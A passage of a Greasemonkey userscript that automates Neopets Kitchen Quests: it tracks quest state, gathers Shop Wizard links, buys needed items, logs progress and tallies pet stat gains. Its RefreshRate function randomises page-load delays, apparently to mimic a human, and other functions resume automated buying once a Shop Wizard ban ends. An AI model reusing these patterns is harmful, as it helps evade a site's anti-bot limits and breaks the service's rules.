			GM_setValue("buttontext", "START QUEST");
			GM_setValue("ContBut", "hidden");
			GM_setValue("hourWait", 0);
			GM_setValue("DoSWBan", 0);
			GM_setValue("EdnaWait", 0);
			GM_setValue("temp", 0);
			ResetNames();
			CommonResets();
			document.getElementById("continueQuestButton").style.visibility = GM_getValue("ContBut", "hidden");
			document.location = "http://www.neopets.com/island/kitchen.phtml";
		};
	};
};

function reset() {
	GM_setValue("Started", 1);
	GM_setValue("shopURL", "");
	GM_setValue("number_itemsNeeded", 0);
	GM_setValue("itemsNeeded", "");
	GM_setValue("numberstocked", 0);
	GM_setValue("numberstocked2", 0);
	ResetNames();
	CommonResets();
};

function Idling() {
	GM_setValue("Started", 0);
	CommonResets();
};

function Offline() {
	GM_setValue("buttontext", "START QUEST");
	GM_setValue("Started", 0);
	GM_setValue("hourWait", 0);
	GM_setValue("ContBut", "hidden");
	GM_setValue("temp", 0);
	ResetNames();
	CommonResets();
};

function CommonResets() {
	GM_setValue("itemfilled", 0);
	GM_setValue("refreshed", 0);
	GM_setValue("results_array", "");
	GM_setValue("getURL", 0);
	GM_setValue("InShop", 0);
	GM_setValue("getNewURL", 0);
	GM_setValue("tryBuy", 0);
	GM_setValue("doneBuying", 0);
	GM_setValue("TotalPrice", 0);
	GM_setValue("searching", 0);
	GM_setValue("klaarSDB", 0);
	GM_setValue("OneDone", 0);
	GM_setValue("readyFinish", 0);
	GM_setValue("LiftBan", 0);
	GM_setValue("doneBank", 1);
};

function ResetNames() {
	GM_setValue("item1", "");
	GM_setValue("item2", "");
	GM_setValue("item3", "");
	GM_setValue("item4", "");
	GM_setValue("numberValidInv", 0);
	GM_setValue("TotalItems", 0);
	GM_setValue("itemname1", "");
	GM_setValue("itemname2", "");
	GM_setValue("itemname3", "");
	GM_setValue("itemname4", "");
	GM_setValue("itemnameSDB1", "");
	GM_setValue("itemnameSDB2", "");
	GM_setValue("itemnameSDB3", "");
	GM_setValue("itemnameSDB4", "");
	GM_setValue("itemnameINV1", "");
	GM_setValue("itemnameINV2", "");
	GM_setValue("itemnameINV3", "");
	GM_setValue("itemnameINV4", "");
	GM_setValue("Idle", 0);
	GM_setValue("QwasIDLE", 0);
	GM_setValue("IdleAbsent", 0);
	GM_setValue("DoQS", 0);
	GM_setValue("QSnumber", "0");
};

function AddShoplinksToArray() {
	var VARIABLE_9 = document.evaluate("//a[contains(@href, \"browseshop\")]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	if (VARIABLE_9.snapshotItem(0) != null) {
		var VARIABLE_1 = GM_getValue("results_array", "").split("|");
		if (VARIABLE_1[0] == "") {
			VARIABLE_1.splice(0, 1);
		};
		for (var i = 0; i < VARIABLE_9.snapshotLength; i++) {
			VARIABLE_1.push(VARIABLE_9.snapshotItem(i));
		};
		GM_setValue("results_array", VARIABLE_1.join("|"));
	};
};

function GetBetween(VARIABLE_10, VARIABLE_11, VARIABLE_12) {
	var VARIABLE_10 = VARIABLE_10;
	var VARIABLE_11 = VARIABLE_11;
	var VARIABLE_12 = VARIABLE_12;
	var VARIABLE_13 = VARIABLE_10.indexOf(VARIABLE_11);
	var VARIABLE_14 = VARIABLE_10.indexOf(VARIABLE_12, VARIABLE_13);
	if (VARIABLE_14 > VARIABLE_13 && VARIABLE_13 > -1) {
		return VARIABLE_10.substring(VARIABLE_13 + VARIABLE_11.length, VARIABLE_14);
	} else {
		return "";
	};
};

function CalculateTotalPrice() {
	var VARIABLE_15 = GM_getValue("item" + GM_getValue("number_itemsNeeded", 0)).split("|");
	var VARIABLE_16 = GM_getValue("TotalPrice", "0") + parseInt(VARIABLE_15[0].split("cost_neopoints=")[1]);
	GM_setValue("TotalPrice", VARIABLE_16);
};

function Continue() {
	GM_setValue("getURL", 1);
	GM_setValue("Idle", 0);
	GM_setValue("ContBut", "hidden");
	GM_setValue("Started", 1);
	GM_setValue("klaarSDB", 0);
	document.getElementById("continueQuestButton").style.visibility = GM_getValue("ContBut", "hidden");
	writeToLog("<br>Purchase of items started.");
	document.location = "http://www.neopets.com/market.phtml?type=wizard";
};

function writeToLog(VARIABLE_17) {
	GM_setValue("Log", GM_getValue("Log", "") + VARIABLE_17 + "<br />");
	logBox.innerHTML = GM_getValue("Log", "Nothing in logfile");
	logBox.scrollTop = logBox.scrollHeight;
};

function ClearLog() {
	GM_setValue("Log", "Nothing in logfile");
	logBox.innerHTML = "";
};

function LogVisibility() {
	if (GM_getValue("visi", "visible") == "visible") {
		GM_setValue("visi", "hidden");
		if (GM_getValue("temp", 0) == 1) {
			GM_setValue("ContBut", "hidden");
			document.getElementById("continueQuestButton").style.visibility = GM_getValue("ContBut", "hidden");
		};
	} else {
		GM_setValue("visi", "visible");
		if (GM_getValue("temp", 0) == 1) {
			GM_setValue("ContBut", "visible");
			document.getElementById("continueQuestButton").style.visibility = GM_getValue("ContBut", "hidden");
		};
	};
	mainbox.style.visibility = GM_getValue("visi");
};

function SingleTab() {
	if (GM_getValue("banned") == 1) {
		GM_setValue("banned", 0);
		GM_setValue("LiftBan", 1);
		GM_setValue("visi", "visible");
		mainbox.style.visibility = GM_getValue("visi");
		writeToLog("<b>Shop Wizard ban is over, restarting last quest...<br></b>");
		if (GM_getValue("AlertMe", "unchecked") == "checked") {
			alert("Shop Wizard ban is over, click ok to continue!");
		};
		document.location = "http://www.neopets.com/island/kitchen.phtml";
	};
};

function SingleTabQuestTimeout() {
	if (GM_getValue("Idle", 0) == 1) {
		GM_setValue("temp", 0);
		GM_setValue("Idle", 0);
		GM_setValue("QwasIDLE", 1);
		GM_setValue("visi", "visible");
		mainbox.style.visibility = GM_getValue("visi");
		GM_setValue("ContBut", "hidden");
		document.getElementById("continueQuestButton").style.visibility = GM_getValue("ContBut", "hidden");
		if (GM_getValue("AlertMe", "unchecked") == "checked") {
			alert("Quest has timed out, next quest will be started, click ok!");
		};
		document.location = "http://www.neopets.com/island/kitchen.phtml";
	};
};

function SingleTabAbsentTimeout() {
	if (GM_getValue("IdleAbsent", 0) == 1) {
		GM_setValue("IdleAbsent", 0);
		GM_setValue("visi", "visible");
		GM_setValue("Started", 1);
		GM_setValue("visi", "visible");
		mainbox.style.visibility = GM_getValue("visi");
		if (GM_getValue("AlertMe", "unchecked") == "checked") {
			alert("Underwater Chef has returned by now, starting quest. Click ok!");
		};
		document.location = "http://www.neopets.com/island/kitchen.phtml";
	};
};

function RefreshRate() {
	if (GM_getValue("frozen", "unchecked") == "checked") {
		n1000 = (Math.floor(parseFloat(GM_getValue("bottomTime", "1")) + parseFloat((GM_getValue("topTime", "3")) - parseFloat(GM_getValue("bottomTime", "1"))) * Math.random())) * 1000;
		n100 = Math.floor(Math.random() * 10) * 100;
		n10 = Math.floor(Math.random() * 10) * 10;
		n1 = Math.floor(Math.random() * 10);
		var RefreshRate = n1000 + n100 + n10 + n1;
	} else {
		var RefreshRate = 1500;
	};
	return RefreshRate;
};

function StatsVisibility() {
	if (GM_getValue("statsvisi", "hidden") == "hidden") {
		GM_setValue("statsvisi", "visible");
		statsbox.style.visibility = GM_getValue("statsvisi", "hidden");
	} else {
		GM_setValue("statsvisi", "hidden");
		statsbox.style.visibility = GM_getValue("statsvisi", "hidden");
	};
};

function ResetStats() {
	GM_setValue("level", 0);
	GM_setValue("hitpoints", 0);
	GM_setValue("strength", 0);
	GM_setValue("defence", 0);
	GM_setValue("agility", 0);
	GM_setValue("NPspent", 0);
	GM_setValue("statsDated", 0);
	GM_setValue("averageSpent", 0);
	GM_setValue("numberQdone", 0);
	GM_setValue("gotstat", 0);
	GM_setValue("gotitem", 0);
	GM_setValue("gotmoney", 0);
	datum = new Date().toString();
	month = datum.split(" ")[1];
	day = datum.split(" ")[2];
	year = datum.split(" ")[3];
	GM_setValue("datum", month + " " + day + " " + year);
	statsbox.innerHTML = "<b><u>STATS SUMMARY</u> </b>since<b> " + GM_getValue("datum", "please reset") + "<br><br><u>Gained pet stats:</u><br></b><b>Level: " + GM_getValue("level", 0) + "<br>Hit Points: " + GM_getValue("hitpoints", 0) + "<br>Strength: " + GM_getValue("strength", 0) + "<br>Defence: " + GM_getValue("defence", 0) + "<br>Movement: " + GM_getValue("agility", 0) + "<br><br><u>Totals:</u><br>Quests completed: " + GM_getValue("numberQdone", 0) + "<br>Total NP spent: " + GM_getValue("NPspent", 0) + " NP<br>Average spent per quest: " + GM_getValue("averageSpent", 0) + " NP<br><br><u>Percentages:</u><br>Item received: " + GM_getValue("gotitem", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotitem", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br>NP received: " + GM_getValue("gotmoney", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotmoney", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br>Pet upgrade received: " + GM_getValue("gotstat", 0) + "/" + GM_getValue("numberQdone", 0) + " (" + Math.round((GM_getValue("gotstat", 0) / GM_getValue("numberQdone", 0)) * 100) + "%)<br><br></b>";
}

function unique(a) {
	var r = new Array();
	o: for (var i = 0, n = a.length; i < n; i++) {

